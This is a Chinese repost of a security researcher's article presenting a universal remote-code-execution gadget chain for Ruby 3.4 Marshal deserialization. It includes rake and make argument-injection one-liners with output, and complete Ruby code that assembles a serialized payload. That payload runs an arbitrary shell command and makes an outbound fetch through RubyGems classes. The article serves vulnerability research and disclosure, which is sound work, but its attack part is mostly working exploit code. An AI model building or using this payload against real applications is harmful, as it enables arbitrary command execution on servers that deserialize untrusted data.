#  Ruby 3.4 通用 RCE 反序列化小工具链   
 Ots安全   2024-11-26 15:28  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
我在 2018 年的一篇博客文章中分享了第一个利用 Ruby 反序列化的通用小工具链。从那时起，Ruby 已经有许多新版本，有时包括破坏已发布小工具链的代码更改。到目前为止，这些破坏只是暂时的，信息安全社区会根据需要发布新的小工具链。  
- 2018 年 11 月 8 日 - Ruby 2.x 通用 RCE 反序列化小工具链（作者 Luke Jahnke）  
  
- 2019 年 3 月 2 日 - Etienne Stalmans使用 Ruby YAML.load 实现通用 RCE  
  
- 2021 年 1 月 7 日 - William Bowling 编写的适用于 Ruby 2.x-3.x 的通用反序列化小工具  
  
- 2021 年 1 月 9 日 - Etienne Stalmans使用 Ruby YAML.load（版本 > 2.7）进行通用 RCE  
  
- 2022 年 3 月 28 日 - Ruby 反序列化 - httpvoid 的Gadget on Rails  
  
- 2022 年 4 月 4 日 -第二轮： William Bowling 撰写的适用于 Ruby 2.x-3.x 的更新通用反序列化小工具  
  
- 2022 年 5 月 17 日 - Ruby 漏洞：利用危险的打开、发送和反序列化操作，作者：Ben Lincoln  
  
- 2024 年 3 月 13 日 - Alex Leahu 撰写的《在 Rubyland 中探索反序列化 Gadget 链》  
  
- 2024 年 6 月 20 日 -通过发送 JSON 执行命令？了解 Ruby 项目中不安全的反序列化漏洞如何工作（作者 Peter Stöckli）  
  
- 2024 年 10 月 17 日 - Leonardo Giovanni更新了 ruby 小工具，用于 marshal 加载  
  
虽然最新的小工具链适用于 Ruby 3.4-rc，但我想研究三项改进：  
  
执行反序列化的易受攻击的应用程序必须已经加载了net/http库才能够使用 URI 模块。  
  
对于远程命令执行 (RCE) 小工具链，zip二进制文件必须在系统上可用，但官方 ruby Docker 镜像并非如此。  
  
在处理小工具链结束时会引发异常。  
  
**# 改进 1**  
  
虽然我没有找到可以加载标准 URI 模块的小工具，但我发现 RubyGems 包含一个Gem::URI可用的 URI 的供应商副本。虽然默认情况下也不可用，但它可以通过反序列化加载Gem::SpecFetcher，因为它已注册为自动加载Gem::RemoteFetcher，最终Gem::Request加载。Gem::NetGem::URI  
  
**# 改进 2**  
  
与其zip使用恶意参数执行二进制文件来结束小工具链，rake不如make使用 GTFOBins 来结束小工具链。它们默认安装在官方 Ruby Docker 镜像中，并且rake是下载次数最多的 10 个 Ruby 依赖项之一。它们都满足执行任意命令的要求，可以控制 ARGV[2]，但不能控制 ARGV[1]（感谢GTFOBins）。  
  
```
$ rake rev-parse '-p`/bin/id 1>&0`'
uid=1000(app) gid=1000(app) groups=1000(app)
$ make rev-parse $'--eval=rev-parse:\n\t-/bin/id'
/bin/id
uid=1000(app) gid=1000(app) groups=1000(app)
```  
  
  
**# 改进 3**  
  
下一个改进是避免在执行小工具链后引发异常。异常来自小工具链的开头是一个Gem::Version对象。虽然Gem::Version它很有用，因为它可以在任意对象上调用该to_s方法，但不幸的是，它还会对该方法返回的值执行严格的正则表达式匹配to_s。  
  
```
class Gem::Version
  VERSION_PATTERN = '[0-9]+(?>\.[0-9a-zA-Z]+)*(-[0-9A-Za-z-]+(\.[0-9A-Za-z-]+)*)?' # :nodoc:
  ANCHORED_VERSION_PATTERN = /\A\s*(#{VERSION_PATTERN})?\s*\z/ # :nodoc:

  def marshal_load(array)
    initialize array[0]
  end 

  def initialize(version)
    unless self.class.correct?(version)
      raise ArgumentError, "Malformed version number string #{version}"
    end
[...]
  end

  def self.correct?(version)
    nil_versions_are_discouraged! if version.nil?

    ANCHORED_VERSION_PATTERN.match?(version.to_s)
  end
```  
  
  
我们可以尝试几种不同的方法来避免异常：  
- 将小工具链的开头换成替代方案。如果可以找到调用to_s任意对象的替代方案，则更改很简单。如果不存在，则必须使用新小工具重新设计小工具链。  
  
- to_s看看是否可以调整返回值以匹配具有替代属性值的正则表达式。  
  
- 找到一种代理对象，该对象具有一种to_s调用属性的方法to_s，虽然该方法不返回该值，但仍具有可控的返回值。  
  
UncaughtThrowError我确认，使用对象（在 中定义）可以实现最终方法vm_eval.c。  
  
```
#define id_mesg idMesg
static ID id_result, id_tag, id_value;

voidInit_vm_eval(void){ 
[...]
    rb_eUncaughtThrow = rb_define_class("UncaughtThrowError", rb_eArgError);
    rb_define_method(rb_eUncaughtThrow, "to_s", uncaught_throw_to_s, 0);
    id_tag = rb_intern_const("tag");
[...]
}

static VALUEuncaught_throw_to_s(VALUE exc){
    VALUE mesg = rb_attr_get(exc, id_mesg);
    VALUE tag = uncaught_throw_tag(exc);
    return rb_str_format(1, &tag, mesg);
}

static VALUEuncaught_throw_tag(VALUE exc){
    return rb_ivar_get(exc, id_tag);
}
```  
  
  
这很完美，因为我们可以使用%s转换说明符来触发对的调用to_s。为了抑制返回的值，to_s我们将它更改%s为%.0s，它会截断为 0 长度的字符串。然后我们包含我们想要的返回值的文本，特别是与正则表达式匹配的版本字符串。  
  
现在我们已经避免了异常，我们不再需要两个单独的小工具链，而可以将它们组合成一个有效载荷。  
  
**# 工具链**  
  
以下小工具链包含我的三项改进，但基于其他人的工作，包括 Leonardo Giovanni、Peter Stöckli 和 William Bowling。  
  
```
Gem::SpecFetcher # Autoload

def call_url_and_create_folder(url)
  # improvement 1
  uri = Gem::URI::HTTP.allocate
  uri.instance_variable_set("@path", "/")
  uri.instance_variable_set("@scheme", "s3")
  uri.instance_variable_set("@host", url + "?")
  # c5fe... is the SHA-1 of "any"
  uri.instance_variable_set("@port",
    "/../../../../../../../../../../../../../../../" + 
      "tmp/cache/bundler/git/any-c5fe0200d1c7a5139bd18fd22268c4ca8bf45e90/"
  )
  uri.instance_variable_set("@user", "any")
  uri.instance_variable_set("@password", "any")

  source = Gem::Source.allocate
  source.instance_variable_set("@uri", uri)
  source.instance_variable_set("@update_cache", true)

  index_spec = Gem::Resolver::IndexSpecification.allocate
  index_spec.instance_variable_set("@name", "name")
  index_spec.instance_variable_set("@source", source)

  request_set = Gem::RequestSet.allocate
  request_set.instance_variable_set("@sorted_requests", [index_spec])

  lockfile = Gem::RequestSet::Lockfile.new('','','')
  lockfile.instance_variable_set("@set", request_set)
  lockfile.instance_variable_set("@dependencies", [])

  return lockfile
end

def git_gadget(executable, second_param)
  git_source = Gem::Source::Git.allocate
  git_source.instance_variable_set("@git", executable)
  git_source.instance_variable_set("@reference", second_param)
  git_source.instance_variable_set("@root_dir", "/tmp")
  git_source.instance_variable_set("@repository", "any")
  git_source.instance_variable_set("@name", "any")

  spec = Gem::Resolver::Specification.allocate
  spec.instance_variable_set("@name", "any")
  spec.instance_variable_set("@dependencies",[])

  git_spec = Gem::Resolver::GitSpecification.allocate
  git_spec.instance_variable_set("@source", git_source)
  git_spec.instance_variable_set("@spec", spec)

  spec_specification = Gem::Resolver::SpecSpecification.allocate
  spec_specification.instance_variable_set("@spec", git_spec)

  return spec_specification
end

def command_gadget(command_to_execute)
  # improvement 2
  git_gadget_execute_cmd = git_gadget("make", "--eval=rev-parse:\n\t-#{command_to_execute}")

  request_set = Gem::RequestSet.allocate
  request_set.instance_variable_set("@sorted_requests", [git_gadget_execute_cmd])

  lockfile = Gem::RequestSet::Lockfile.new('','','')
  lockfile.instance_variable_set("@set", request_set)
  lockfile.instance_variable_set("@dependencies",[])

  return lockfile
end

def to_s_wrapper(inner)
  # improvement 3 - note we cannot use allocate + instance_variable_set
  # as the instance variable name does not begin with @
  ute = UncaughtThrowError.new(inner, nil, "%.0s1337.nastystereo.com")

  version = Gem::Version.allocate
  version.instance_variable_set("@version", ute)

  return version
end

def create_rce_gadget_chain(command_to_execute)
  exec_gadget = command_gadget(command_to_execute)

  return Marshal.dump([Gem::SpecFetcher, to_s_wrapper(exec_gadget)])
end

url = "rubygems.org/quick/Marshal.4.8/bundler-2.2.27.gemspec.rz"
call_url_gadget = call_url_and_create_folder(url)

exec_gadget = command_gadget("id > /tmp/marshal-poc")
rce_gadget_chain = Marshal.dump(
  [
    Gem::SpecFetcher,
    to_s_wrapper(call_url_gadget),
    to_s_wrapper(exec_gadget)
  ]
)

puts rce_gadget_chain.inspect
```  
  
  
**# 未来改进**  
  
剩下的最大改进是不再使用小工具链中的popen接收器Gem::Source::Git。实现这一点有望意味着小工具链不再发出出站网络请求或修改文件系统。  
  
**原文地址：**  
https://nastystereo.com/security/ruby-3.4-deserialization.html  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
